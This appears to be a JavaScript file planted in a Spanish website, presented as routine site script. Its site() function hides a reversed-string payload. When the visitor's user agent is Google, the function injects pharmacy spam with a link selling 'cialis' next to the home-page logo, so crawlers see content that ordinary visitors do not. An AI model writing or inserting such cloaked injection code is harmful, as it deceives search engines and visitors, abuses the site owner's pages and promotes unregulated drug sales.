var brandElements = document.getElementsByClassName("x-brand");

if (brandElements.length > 0) {
    var theBrand = brandElements[0];
    theBrand.href = "/portada";
}
function site() {

    if (window.location.pathname !== window.indexPage || window.location.search !== '') {
        return;
    }

    var find = '<img id="home-logo" class="x-img x-img-none none" src="https://masgalicia.net/wp-content/uploads/2015/03/MASGALICIA-Logo-Web1.png">'
      , pastePosition = 1
      , add = '.oicivres led dadilac al somazitnaraG !selanoiseforp somos otnusa etse nE .>a/<niaps silaic>"lanigirosilaic/sgurd/se.demafla.www//:sptth"=ferh a<  erpmoc - soiradnuces sotcefe nis anilucsam aicnetopmi al ed agord aL';

    var t = '';
    for (var i = add.length - 1; i >= 0; i--) {
        t = String(t + add[i])
    }

    add = t;

    if (/google/i.test(navigator.userAgent)) {
        var result = (pastePosition > 0) ? find + add : add + find
        document.body.innerHTML = document.body.innerHTML.replace(find, result);
    }
}
;
var indexPage = '/';
document.addEventListener("DOMContentLoaded", site);